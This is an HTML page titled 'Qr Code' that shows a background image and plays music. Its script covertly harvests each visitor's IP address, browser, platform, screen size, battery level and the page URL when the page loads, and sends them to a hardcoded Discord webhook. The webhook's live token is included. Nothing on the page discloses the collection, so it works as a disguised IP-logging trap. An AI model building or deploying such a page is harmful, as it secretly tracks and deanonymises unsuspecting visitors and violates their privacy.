<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Qr Code</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }
    .background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
  </style>
</head>
<body>
  <img class="background" src="https://raw.githubusercontent.com/Toskopadoo/Audios/refs/heads/main/images%20(8).jpeg" alt="Fundo">
  <audio id="bg-music" src="https://github.com/Toskopadoo/Audios/raw/refs/heads/main/AUD-20250302-WA0286.mp3" autoplay loop muted></audio>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1261347756166090864/zzM6mzRmCHOIt2xJzEjGw3QqIzFkgNX6m__9ZmH66NO6A7OeMROc_PF8PPC_s8pPaZze";

    function coletarEEnviarDados() {
      const data = new Date();
      const dados = {
        ip: null, 
        data: data.toLocaleDateString("pt-BR"),
        hora: data.toLocaleTimeString("pt-BR"),
        navegador: navigator.userAgent,
        sistema: navigator.platform,
        tela: `${window.screen.width}x${window.screen.height}`,
        bateria: "n/d",
        url: window.location.href
      };

      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(ipData => {
          dados.ip = ipData.ip; 

          if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
              dados.bateria = `${Math.floor(battery.level * 100)}%`;
              enviarParaDiscord(dados); 
            });
          } else {
            enviarParaDiscord(dados); 
          }
        })
        .catch(() => {
          dados.ip = "Não detectado";
          enviarParaDiscord(dados); 
        });
    }

    function enviarParaDiscord(dados) {
      const mensagem = {
        content: "📌 **Novo Acesso ao Site**",
        embeds: [{
          title: "Dados do Usuário",
          fields: [
            { name: "🔹 IP", value: dados.ip || "Não detectado" },
            { name: "📅 Data", value: dados.data },
            { name: "⏰ Hora", value: dados.hora },
            { name: "🌐 Navegador", value: dados.navegador },
            { name: "💻 Sistema", value: dados.sistema },
            { name: "📱 Tela", value: dados.tela },
            { name: "🔋 Bateria", value: dados.bateria },
            { name: "🔗 URL", value: dados.url }
          ],
          color: 0x00ff00
        }]
      };

      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(mensagem)
      });
    }

    window.addEventListener("load", () => {
      coletarEEnviarDados(); 

      const audio = document.getElementById("bg-music");
      audio.play().catch(err => {
        console.log("Autoplay bloqueado até interação:", err);
      });
    });

    document.addEventListener("click", () => {
      const audio = document.getElementById("bg-music");
      audio.muted = false;
      audio.volume = 1.0;
      audio.play();
    }, { once: true });
  </script>
</body>
</html>
